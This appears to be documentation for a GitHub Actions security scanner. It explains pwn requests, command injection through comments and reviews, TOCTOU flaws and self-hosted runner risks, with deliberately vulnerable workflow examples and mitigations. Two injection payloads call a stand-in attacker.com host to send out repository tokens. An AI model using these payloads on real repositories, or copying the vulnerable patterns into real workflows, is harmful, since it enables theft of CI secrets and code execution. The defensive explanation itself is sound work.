# Understanding GitHub Actions Vulnerabilities

This page provides detailed explanations of the vulnerability types that Gato-X can identify in GitHub Actions workflows.

## Pwn Requests

Pwn Requests are a class of vulnerabilities that allow attackers to execute code in a GitHub Actions workflow by submitting a pull request.

### How They Work

1. A repository has a workflow that uses the `pull_request_target` event trigger
2. The workflow accesses user-controlled content from the pull request
3. The workflow executes this content with elevated permissions

### Example Vulnerable Workflow

```yaml
name: Vulnerable Workflow
on:
  pull_request_target:
    types: [opened, synchronize]

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}
      - name: Run script from PR
        run: |
          chmod +x ./scripts/build.sh
          ./scripts/build.sh
```

### Why It's Dangerous

The `pull_request_target` event runs with the permissions of the target repository, including access to secrets. By checking out code from the pull request and executing it, the workflow allows attackers to run arbitrary code with these elevated permissions.

## Actions Injection

Actions Injection vulnerabilities allow attackers to execute arbitrary code by injecting malicious input into workflow steps.

### How They Work

1. A workflow uses user-controlled input (like issue comments or PR titles)
2. This input is used directly in commands or scripts without proper validation
3. Attackers can inject shell commands that will be executed by the workflow

### Example Vulnerable Workflow

```yaml
name: Issue Comment Handler
on:
  issue_comment:
    types: [created]

jobs:
  process-comment:
    if: contains(github.event.comment.body, '/deploy')
    runs-on: ubuntu-latest
    steps:
      - name: Process deployment request
        run: |
          ENVIRONMENT=$(echo "${{ github.event.comment.body }}" | awk '{print $2}')
          ./deploy.sh $ENVIRONMENT
```

### Why It's Dangerous

In this example, an attacker could comment `/deploy prod; curl http://attacker.com/exfil?token=$SECRET_TOKEN;` to inject additional commands that would be executed by the workflow.

### Pull Request Review Injection

Pull request review events are particularly dangerous because they can only be triggered from feature branches, making them harder to detect and restrict.

#### Example Vulnerable Workflow

```yaml
name: Review Response Handler
on:
  pull_request_review:
    types: [submitted]

jobs:
  process-review:
    runs-on: ubuntu-latest
    steps:
      - name: Process review feedback
        run: |
          echo "Processing review: ${{ github.event.review.body }}"
          # Vulnerable: directly using review body in command
          FEEDBACK=$(echo "${{ github.event.review.body }}" | grep -o "feedback:.*")
          ./process_feedback.sh "$FEEDBACK"
```

#### Why It's Dangerous

**Critical Security Note**: The `pull_request_review` event is only injectable from feature branches, not from forks. This means:

1. **Higher privilege**: Attackers who can create feature branches typically have write access to the repository
2. **Harder to detect**: Review-based attacks may be overlooked compared to obvious pull request attacks
3. **Trusted context**: Reviews appear in a trusted context, making malicious payloads less suspicious

An attacker with write access could submit a review with malicious content like:
```
This looks good! feedback: good"; curl http://attacker.com/exfil?secrets=$GITHUB_TOKEN; echo "
```

This would result in command injection when the workflow processes the review body.

## TOCTOU Vulnerabilities

Time-of-Check to Time-of-Use (TOCTOU) vulnerabilities occur when there's a gap between when a workflow checks conditions and when it uses resources.

### How They Work

1. A workflow checks conditions (like branch protection or permissions)
2. Between the check and the execution, the conditions change
3. The workflow executes with assumptions that are no longer valid

### Example Vulnerable Workflow

```yaml
name: TOCTOU Vulnerable Workflow
on:
  workflow_dispatch:
    inputs:
      pr_number:
        description: 'Pull request number to deploy'
        required: true

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - name: Get PR details
        id: get_pr
        run: |
          PR_DATA=$(gh api repos/${{ github.repository }}/pulls/${{ github.event.inputs.pr_number }})
          echo "::set-output name=head_sha::$(echo $PR_DATA | jq -r .head.sha)"
          echo "::set-output name=author::$(echo $PR_DATA | jq -r .user.login)"
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      - name: Check if PR author has write access
        id: check_permissions
        run: |
          # Check if PR author has write access
          if [[ $(gh api repos/${{ github.repository }}/collaborators/${{ steps.get_pr.outputs.author }}/permission | jq -r .permission) == "write" ]]; then
            echo "::set-output name=has_permission::true"
          else
            echo "::set-output name=has_permission::false"
          fi
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      - uses: actions/checkout@v3
        with:
          ref: ${{ steps.get_pr.outputs.head_sha }}
      - name: Deploy
        if: steps.check_permissions.outputs.has_permission == 'true'
        run: ./deploy.sh
        env:
          DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}
```

### Why It's Dangerous

The real vulnerability occurs when a user with write access triggers this workflow on a fork's pull request. After the permission check passes (based on the triggering user's permissions), the original PR author can push new malicious code to their fork. The workflow will then execute this malicious code with the elevated permissions, even though the code wasn't reviewed by the authorized user.

## Self-Hosted Runner Vulnerabilities

Self-hosted runners can introduce various security risks, especially when they're configured to run workflows from public repositories or forks.

### How They Work

1. A repository uses self-hosted runners for its workflows
2. The runners are configured to run workflows from public repositories or forks
3. Attackers can submit workflows that execute on these runners

### Example Vulnerable Configuration

```yaml
name: CI on Self-Hosted Runner
on:
  pull_request:
    branches: [ main ]

jobs:
  build:
    runs-on: self-hosted
    steps:
      - uses: actions/checkout@v3
      - name: Build and test
        run: |
          npm install
          npm test
```

### Why It's Dangerous

If this workflow runs on pull requests from forks without approval requirements, attackers can submit malicious workflows that execute on the self-hosted runner. This could lead to:

1. Access to secrets available to the runner
2. Access to the runner's file system and network
3. Potential lateral movement within the organization's network
4. Persistence through the Runner-on-Runner technique

## Mitigation Strategies

### For Pwn Requests

- Avoid using `pull_request_target` when possible
- If you must use it, don't check out untrusted code
- Use `github.base_ref` instead of `github.event.pull_request.head.sha`
- Implement proper input validation

### For Actions Injection

- Validate and sanitize all user inputs
- Use explicit allow-lists for permitted values
- Avoid using user input directly in commands
- Use GitHub's `contains()` function with an array of allowed values

### For TOCTOU Vulnerabilities

- Minimize the time between checks and actions
- Re-verify critical conditions before executing sensitive operations
- Use GitHub's built-in permission checks when possible

### For Self-Hosted Runners

- Use ephemeral runners that are destroyed after each job
- Implement approval requirements for workflows from forks
- Run runners in isolated environments (containers or VMs)
- Apply the principle of least privilege to runner permissions
